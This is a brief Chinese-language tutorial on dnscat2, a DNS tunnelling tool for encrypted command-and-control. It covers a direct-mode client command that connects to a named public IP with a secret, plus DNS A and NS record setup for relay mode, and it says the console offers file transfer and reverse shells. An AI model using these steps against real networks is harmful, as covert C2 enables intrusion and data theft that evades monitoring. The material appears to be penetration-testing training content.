# Dnscat2
# 一、Dnscat2简介
dnscat2是一个DNS隧道工具，通过DNS协议创建加密的命令和控制通道，它的一大特色就是服务端会有一个命令行控制台，所有的指令都可以在该控制台内完成。包括：文件上传、下载、反弹Shell。


# 二、Dnscat2直连模式
直连模式：客户端直接向指定IP的恶意DNS服务器发起DNS解析请求。

## 2.启动客户端
注意：server处的IP地址填写你在公网VPS上启动dnscat服务的公网IP地址
```
dnscat2.exe --dns server=8.134.220.192,port=53 --secret=a116c1e3c554fa661f573886065ed845
```

# 三、Dnscat2中继模式
## 1.介绍
DNS解析先经过互联网的迭代解析，最后指向我们的恶意DNS服务器。相比直连，速度较慢，但是更安全。

## 2.配置DNS域名解析
- 创建A记录，将自己的域名解析服务器（ns.yijingsec.top）指向云服务器（8.134.220.192）
- 创建NS记录，将子域名 dnsch.yijingsec.top的DNS解析交给 ns.yijingsec.top
